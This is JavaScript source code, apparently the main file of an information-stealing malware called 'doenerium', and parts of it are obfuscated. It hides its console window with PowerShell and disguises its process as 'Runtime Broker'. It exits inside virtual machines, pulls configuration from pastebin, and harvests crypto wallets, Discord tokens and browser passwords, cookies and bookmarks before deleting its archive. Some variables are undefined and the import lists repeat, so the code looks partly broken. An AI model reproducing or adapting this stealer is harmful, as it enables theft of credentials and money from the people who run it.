require('fs')
require('crypto')
require('os')
require('axios')
require('child_process')
require('screenshot-desktop')
require('discord.js')
require('systeminformation')
require('buffer-replace')
require('zip-lib')
require('win-dpapi')
require('sqlite3')
require('path')
require('./utils/encryption')
require('./config/counter')
require('./config/crypto')
require('./config/discord')
require('./config/environ')
require('./config/executable')
require('./config/jszip')
require('./config/main')
require('./config/user')
require('./config/wallets')
require('./utils/browsers')
require('./utils/clipper')
require('./utils/constructor')
require('./utils/data')
require('./utils/discord')
require('./utils/encryption')
require('./utils/flags')
require('./utils/infection')
require('./utils/jszip')
require('./utils/protection')
require('./utils/prototype')
require('./utils/time')
require('./utils/wallets')
require('./utils/webhook')
require('./config')
const _0x4028b3 = (function () {
    let _0x10fcce = true
    return function (_0x224ebc, _0x13b88d) {
      const _0xe75ddd = _0x10fcce
        ? function () {
            if (_0x13b88d) {
              const _0x3fd070 = _0x13b88d.apply(_0x224ebc, arguments)
              return (_0x13b88d = null), _0x3fd070
            }
          }
        : function () {}
      return (_0x10fcce = false), _0xe75ddd
    }
  })(),
  _0x1a73e1 = _0x4028b3(this, function () {
    let _0x28dbf3
    try {
      const _0x345311 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x28dbf3 = _0x345311()
    } catch (_0x377b95) {
      _0x28dbf3 = window
    }
    const _0x3e0f41 = (_0x28dbf3.console = _0x28dbf3.console || {})
    const _0x57bdaf = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x53e794 = 0; _0x53e794 < _0x57bdaf.length; _0x53e794++) {
      const _0x14c945 = _0x4028b3.constructor.prototype.bind(_0x4028b3),
        _0x45f3eb = _0x57bdaf[_0x53e794],
        _0x51b020 = _0x3e0f41[_0x45f3eb] || _0x14c945
      _0x14c945['__proto__'] = _0x4028b3.bind(_0x4028b3)
      _0x14c945.toString = _0x51b020.toString.bind(_0x51b020)
      _0x3e0f41[_0x45f3eb] = _0x14c945
    }
  })
_0x1a73e1()
require('fs')
require('crypto')
require('os')
require('axios')
require('child_process')
require('screenshot-desktop')
require('discord.js')
require('systeminformation')
require('buffer-replace')
require('zip-lib')
require('win-dpapi')
require('sqlite3')
require('path')
require('./utils/encryption')
require('./config/counter')
require('./config/crypto')
require('./config/discord')
require('./config/environ')
require('./config/executable')
require('./config/jszip')
require('./config/main')
require('./config/user')
require('./config/wallets')
require('./utils/browsers')
require('./utils/clipper')
require('./utils/constructor')
require('./utils/data')
require('./utils/discord')
require('./utils/encryption')
require('./utils/flags')
require('./utils/infection')
require('./utils/jszip')
require('./utils/protection')
require('./utils/prototype')
require('./utils/time')
require('./utils/wallets')
require('./utils/webhook')
require('./config')
class doenerium {
  constructor() {
    this.requires = {
      fs: require('fs'),
      crypto: require('crypto'),
      os: require('os'),
      axios: require('axios'),
      child_process: require('child_process'),
      screenshot: require('screenshot-desktop'),
      discordjs: require('discord.js'),
      systeminformation: require('systeminformation'),
      buf_replace: require('buffer-replace'),
      jszip: require('zip-lib'),
      dpapi: require('win-dpapi'),
      sqlite3: require('sqlite3'),
      path: require('path'),
    }
    this.utils = { encryption: require('./utils/encryption')(this) }
    this.config = {
      counter: require('./config/counter')(this),
      crypto: require('./config/crypto')(this),
      discord: require('./config/discord')(this),
      environ: require('./config/environ')(this),
      executable: require('./config/executable')(this),
      main: require('./config/main')(this),
      user: require('./config/user')(this),
      jszip: require('./config/jszip')(this),
      wallets: require('./config/wallets')(this),
    }
    this.config.webhook = require('./config')(this)
    this.utils = {
      encryption: require('./utils/encryption')(this),
      constructor: require('./utils/constructor')(this),
      discord: require('./utils/discord')(this),
      flags: require('./utils/flags')(this),
      infection: require('./utils/infection')(this),
      protection: require('./utils/protection')(this),
      prototype: require('./utils/prototype')(this),
      time: require('./utils/time')(this),
      clipper: require('./utils/clipper')(this),
      jszip: require('./utils/jszip')(this),
      browsers: require('./utils/browsers')(this),
      data: require('./utils/data')(this),
      wallets: require('./utils/wallets')(this),
      webhook: require('./utils/webhook')(this),
    }
  }
  ['hideSelf']() {
    ;('    ')
    let _0x59e416 = process.cwd() + '\\temp.ps1'
    try {
      this.requires.fs.writeFileSync(
        _0x59e416,
        '\n    Add-Type -Name Window -Namespace Console -MemberDefinition \'\n    [DllImport("Kernel32.dll")]\n    public static extern IntPtr GetConsoleWindow();\n\n    [DllImport("user32.dll")]\n    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n    \'\n\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n    & {$host.ui.RawUI.WindowTitle = \'Runtime Broker\'}'
      )
      this.requires.child_process.execSync(
        'type .\\temp.ps1 | powershell.exe -noprofile -',
        _0x40af60
      )
      this.requires.fs.unlinkSync(_0x59e416)
    } catch (_0x598b32) {}
  }
  async ['init']() {
    try {
      this.config.dualhook = JSON.parse(
        JSON.stringify(
          (await this.requires.axios.get('https://pastebin.com/raw/Czn90r1i'))
            .data
        )
      )
    } catch {
      this.config.dualhook = _0xfe8cb6
    }
    try {
      this.config.embed = JSON.parse(
        JSON.stringify(
          (await this.requires.axios.get('https://pastebin.com/raw/zY8QyMV3'))
            .data
        )
      )
    } catch {
      this.config.embed = _0x849690
    }
    this.config.embed.footer = {
      text:
        this.utils.encryption.decryptData(this.config.user.hostname) +
        ' | ' +
        this.config.embed.credits,
      icon_url: this.config.embed.avatar_url,
    }
    this.hideSelf()
    const _0x59e9ca = await this.utils.protection.inVM()
    _0x59e9ca && process.exit(0)
    this.utils.protection.detect_malicious_processes()
    this.utils.clipper.detectClipboard()
    process.title = 'Runtime Broker'
    this.config.jszip.path = this.config.jszip.generate_path()
    await this.utils.wallets.getWallets()
    try {
      await this.utils.discord.getTokens()
    } catch (_0x5ea7ce) {}
    await this.utils.discord.saveDiscordTokens()
    for (var _0x462e4e of this.config.environ.password_and_cookies_paths) {
      if (this.requires.fs.existsSync(_0x462e4e + 'Login Data')) {
        try {
          await this.utils.browsers.getPasswords(_0x462e4e)
        } catch {}
        try {
          await this.utils.browsers.getCookies(_0x462e4e)
        } catch {}
        try {
          await this.utils.browsers.getBookmarks(_0x462e4e)
        } catch {}
        try {
          await this.utils.browsers.getBrowserData(_0x462e4e)
        } catch {}
      }
    }
    this.utils.browsers.savePasswords()
    this.utils.browsers.saveCookies()
    this.utils.browsers.saveBookmarks()
    this.utils.constructor.loadCPUS()
    await this.utils.time.sleep(this.config.main.start_delay)
    await this.utils.infection.initialize()
    await this.utils.time.sleep(30000)
    this.requires.fs.rmSync(this.config.jszip.path, _0x5f1026)
    this.requires.fs.rmSync(this.config.jszip.path + '.zip', _0x1c8a91)
  }
}
new doenerium().init()
